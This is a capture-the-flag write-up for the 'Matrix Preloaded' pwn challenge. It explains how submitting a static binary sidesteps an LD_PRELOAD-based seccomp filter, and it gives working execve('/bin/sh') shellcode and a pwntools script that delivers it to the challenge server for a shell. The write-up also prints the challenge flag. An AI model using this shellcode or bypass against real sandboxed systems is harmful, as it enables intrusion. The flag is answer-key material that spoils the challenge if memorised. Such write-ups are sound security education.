https://ctftime.org/event/2234/

# Matrix Preloaded ~ PWN

We’ll let you run any code you wish, Mr. Anderson. We trust that you won’t do anything irresponsible.

nc 158.178.197.18 39909

https://dl.1753ctf.com/matrix-preloaded?s=Dgr59R5h

## Solution

When invoked with a static binary the `LD_PRELOAD` directive has no effect. As a result the seccomp filter doesn't apply and you can use any syscalls.

```
; nasm -felf64 shellcode.asm && ld shellcode.o -o shellcode

section .text
global _start

_start:
    push rax
    xor rdx, rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall
```

```
from pwn import *
import struct

REMOTE_IP = "158.178.197.18"
REMOTE_PORT = 39909

p = remote(REMOTE_IP, REMOTE_PORT)

with open("./shellcode", "rb") as f:
    shellcode = f.read()

p.send(struct.pack('!H', len(shellcode)))

p.sendline(shellcode)

p.clean()

p.interactive()
```

After getting the shell simply `cat ./flag`.

## Flag
`1753c{there_is_no_preload_theres_just_ld_linux_x86_64_so_2}`
